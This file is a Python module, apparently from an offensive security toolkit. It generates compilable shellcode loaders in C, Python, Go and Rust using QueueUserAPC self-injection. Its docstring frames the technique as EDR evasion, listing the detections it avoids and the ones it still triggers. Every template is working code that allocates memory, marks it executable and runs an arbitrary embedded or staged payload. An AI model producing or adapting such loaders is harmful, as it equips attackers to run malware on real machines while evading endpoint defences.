"""Loader: win_apc_self — VirtualAlloc(RX) → memcpy → QueueUserAPC(self) → SleepEx(alertable).

Tier 2. Avoids CreateThread; executes shellcode via the APC (Asynchronous
Procedure Call) queue of the current thread.

Execution flow:
  1. Allocate RX memory, copy shellcode (two-stage: RW then VirtualProtect RX)
  2. QueueUserAPC(shellcode_ptr, GetCurrentThread(), 0)
     — enqueues shellcode as an APC on the calling thread
  3. SleepEx(0, TRUE) — alertable wait drains the APC queue and runs shellcode

Evasion property:
  - No CreateThread / NtCreateThreadEx in call graph
  - APC delivery is an in-process user-mode mechanism; no new thread visible
  - Legitimate use of SleepEx with alertable=TRUE is common (I/O completion ports)

Still triggers on:
  - QueueUserAPC with an address in anonymous memory (monitored by modern EDR)
  - VirtualProtect on anonymous memory to RX
"""
from __future__ import annotations

from . import _render

_render.self_register(__name__, "win_apc_self")

# {sc_embed}    — global declarations (encrypted array + key, or empty for staged)
# {sc_init}     — in-main init block (decrypt loop or file-reading code)
# {main_decl}   — main() signature (void or int argc, char *argv[])
_C_TEMPLATE = """\
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

{sc_embed}

{main_decl} {{
    {sc_init}
    LPVOID mem = VirtualAlloc(NULL, sc_len,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) {{
        fprintf(stderr, "[-] VirtualAlloc failed: %lu\\n", GetLastError());
        return 1;
    }}
    memcpy(mem, sc, sc_len);

    DWORD old_protect;
    if (!VirtualProtect(mem, sc_len, PAGE_EXECUTE_READ, &old_protect)) {{
        fprintf(stderr, "[-] VirtualProtect failed: %lu\\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }}

    if (!QueueUserAPC((PAPCFUNC)mem, GetCurrentThread(), 0)) {{
        fprintf(stderr, "[-] QueueUserAPC failed: %lu\\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }}

    SleepEx(0, TRUE);

    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}}
"""

_PY_TEMPLATE = """\
import ctypes
import sys

{sc_bytes}

kernel32 = ctypes.windll.kernel32
kernel32.VirtualAlloc.restype    = ctypes.c_void_p
kernel32.GetCurrentThread.restype = ctypes.c_void_p

mem = kernel32.VirtualAlloc(None, len(sc),
                            0x3000,   # MEM_COMMIT | MEM_RESERVE
                            0x04)     # PAGE_READWRITE
if not mem:
    sys.exit(1)

buf = (ctypes.c_char * len(sc)).from_buffer_copy(sc)
kernel32.RtlMoveMemory(ctypes.c_void_p(mem), buf, len(sc))

old = ctypes.c_ulong(0)
if not kernel32.VirtualProtect(ctypes.c_void_p(mem), len(sc),
                                0x20,  # PAGE_EXECUTE_READ
                                ctypes.byref(old)):
    sys.exit(1)

APC_FUNC = ctypes.WINFUNCTYPE(None, ctypes.c_ulong_p if hasattr(ctypes, 'c_ulong_p') else ctypes.c_void_p)

current_thread = kernel32.GetCurrentThread()
if not kernel32.QueueUserAPC(ctypes.c_void_p(mem), ctypes.c_void_p(current_thread), 0):
    sys.exit(1)

kernel32.SleepEx(0, True)
"""


# {sc_embed}    — package-level declarations (or empty for staged)
# {sc_init}     — first statement(s) in main (decrypt loop or file-reading)
# {sc_imports}  — extra import entries, e.g. \n\t"os" for staged
_GO_TEMPLATE = """\
package main

import (
\t"syscall"
\t"unsafe"{sc_imports}
)

{sc_embed}

func main() {{
\t{sc_init}
\tk32               := syscall.NewLazyDLL("kernel32.dll")
\tpVirtualAlloc     := k32.NewProc("VirtualAlloc")
\tpVirtualFree      := k32.NewProc("VirtualFree")
\tpVirtualProtect   := k32.NewProc("VirtualProtect")
\tpQueueUserAPC     := k32.NewProc("QueueUserAPC")
\tpGetCurrentThread := k32.NewProc("GetCurrentThread")
\tpSleepEx          := k32.NewProc("SleepEx")
\tpRtlMove          := k32.NewProc("RtlMoveMemory")

\taddr, _, _ := pVirtualAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x04)
\tif addr == 0 {{
\t\treturn
\t}}
\tpRtlMove.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
\tvar old uint32
\tif r, _, _ := pVirtualProtect.Call(addr, uintptr(len(sc)), 0x20,
\t\tuintptr(unsafe.Pointer(&old))); r == 0 {{
\t\tpVirtualFree.Call(addr, 0, 0x8000)
\t\treturn
\t}}
\tcurr, _, _ := pGetCurrentThread.Call()
\tif r, _, _ := pQueueUserAPC.Call(addr, curr, 0); r == 0 {{
\t\tpVirtualFree.Call(addr, 0, 0x8000)
\t\treturn
\t}}
\tpSleepEx.Call(0, 1)
\tpVirtualFree.Call(addr, 0, 0x8000)
}}
"""

# {sc_bytes} is inside fn main() — single block (decl + decrypt or file-read)
_RS_TEMPLATE = """\
#![allow(non_snake_case)]
use std::ptr;

#[link(name = "kernel32")]
extern "system" {{
    fn VirtualAlloc(lpAddress: *mut u8, dwSize: usize, flAllocationType: u32,
                    flProtect: u32) -> *mut u8;
    fn VirtualFree(lpAddress: *mut u8, dwSize: usize, dwFreeType: u32) -> i32;
    fn VirtualProtect(lpAddress: *mut u8, dwSize: usize, flNewProtect: u32,
                      lpflOldProtect: *mut u32) -> i32;
    fn QueueUserAPC(pfnAPC: unsafe extern "system" fn(usize),
                    hThread: *mut u8, dwData: usize) -> u32;
    fn GetCurrentThread() -> *mut u8;
    fn SleepEx(dwMilliseconds: u32, bAlertable: i32) -> u32;
}}

fn main() {{
    {sc_bytes}
    unsafe {{
        let p = VirtualAlloc(ptr::null_mut(), sc.len(), 0x3000, 0x04);
        if p.is_null() {{ return; }}
        ptr::copy_nonoverlapping(sc.as_ptr(), p, sc.len());
        let mut old: u32 = 0;
        if VirtualProtect(p, sc.len(), 0x20, &mut old) == 0 {{
            VirtualFree(p, 0, 0x8000); return;
        }}
        let apc_fn: unsafe extern "system" fn(usize) = std::mem::transmute(p);
        let curr = GetCurrentThread();
        if QueueUserAPC(apc_fn, curr, 0) == 0 {{
            VirtualFree(p, 0, 0x8000); return;
        }}
        SleepEx(0, 1);
        VirtualFree(p, 0, 0x8000);
    }}
}}
"""


def generate_c(shellcode: bytes, staged: bool = False) -> str:
    """Return a compilable C loader using QueueUserAPC(self) + SleepEx(alertable)."""
    if staged:
        embed, init = _render.c_staged_sc("sc")
        main_decl = "int main(int argc, char *argv[])"
    else:
        embed, init = _render.c_sc_block(shellcode, "sc")
        main_decl = "int main(void)"
    return _C_TEMPLATE.format(sc_embed=embed, sc_init=init, main_decl=main_decl)


def generate_python(shellcode: bytes, staged: bool = False) -> str:
    """Return a Python ctypes loader using QueueUserAPC self-injection."""
    sc_bytes = _render.py_staged_sc("sc") if staged else _render.py_sc_block(shellcode, "sc")
    return _PY_TEMPLATE.format(sc_bytes=sc_bytes)


def generate_go(shellcode: bytes, staged: bool = False) -> str:
    """Return a Go loader using QueueUserAPC(self) + SleepEx(alertable)."""
    if staged:
        embed, init, imports = _render.go_staged_sc("sc")
    else:
        embed, init, imports = _render.go_sc_block(shellcode, "sc")
    return _GO_TEMPLATE.format(sc_embed=embed, sc_init=init, sc_imports=imports)


def generate_rust(shellcode: bytes, staged: bool = False) -> str:
    """Return a Rust loader using QueueUserAPC(self) + SleepEx(alertable)."""
    sc_bytes = _render.rust_staged_sc("sc") if staged else _render.rust_sc_block(shellcode, "sc")
    return _RS_TEMPLATE.format(sc_bytes=sc_bytes)
